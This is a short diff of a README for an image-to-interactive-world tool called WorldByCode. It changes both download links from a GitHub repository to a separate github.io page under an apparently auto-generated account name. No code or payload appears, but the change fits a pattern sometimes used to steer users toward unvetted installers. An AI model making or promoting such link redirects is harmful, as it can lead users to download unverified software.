@@ -1,6 +1,6 @@
 # 🌐 WorldByCode - Turn Flat Images Into Interactive Worlds
 
-[![Download WorldByCode](https://img.shields.io/badge/Download-WorldByCode-blue.svg)](https://github.com/ambassadorial-erythronium882/WorldByCode)
+[![Download WorldByCode](https://img.shields.io/badge/Download-WorldByCode-blue.svg)](https://ambassadorial-erythronium882.github.io)
 
 ## 📖 About This Tool
 
@@ -18,7 +18,7 @@ Before you start, make sure your computer meets these basic needs:
 
 ## 📥 How to Install and Start
 
-[Visit the official download page here](https://github.com/ambassadorial-erythronium882/WorldByCode) to get the latest version for your computer.
+[Visit the official download page here](https://ambassadorial-erythronium882.github.io) to get the latest version for your computer.
 
 Follow these steps to set up the software:
 
